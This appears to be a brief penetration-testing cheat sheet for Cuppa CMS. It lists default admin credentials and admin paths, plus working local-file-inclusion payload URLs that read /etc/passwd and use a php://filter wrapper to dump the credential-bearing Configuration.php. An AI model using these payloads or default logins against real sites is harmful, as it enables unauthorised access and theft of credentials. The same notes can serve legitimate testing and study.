# cuppa cms

## Default Creds

```
admin:admin
# authenticated
- IP/administrator/?option=com_general_config
```

## Interesting Paths

```bash
/administrator
/administrator/Configuration.php
```

### LFI / RFI

```
https://www.exploit-db.com/exploits/25971
# /administrator/alerts/alertConfigField.php?urlConfig=/etc/passwd
# /administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
```

##
